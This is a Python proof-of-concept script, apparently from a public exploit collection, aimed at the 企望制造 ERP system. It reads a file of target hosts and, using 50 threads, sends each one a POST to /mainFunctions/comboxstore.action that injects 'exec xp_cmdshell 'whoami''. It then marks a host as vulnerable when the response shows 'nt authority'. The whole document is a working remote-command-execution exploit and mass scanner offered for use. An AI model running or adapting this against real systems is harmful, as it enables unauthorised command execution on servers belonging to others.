#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# title="企望制造ERP系统"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+---------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 Qiwangzhizao_ERP_Comboxstore_Rce_Poc.py url.txt                                             +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
} 
def poc(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept-Encoding": "gzip,deflate",
        "Accept":"*/*",
        "Connection":"close",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Content-Length":"40",
        "Host":"%s" % host2

    }
    vulurl = url + "/mainFunctions/comboxstore.action"
    data="comboxsql=exec%20xp_cmdshell%20'whoami'"
    try:
        r = requests.post(vulurl, headers=headers,data=data)
        #print(r.content)
        if r.status_code==200 and "nt authority" in str(r.content) :
            print(host+" :true ")
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")

if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])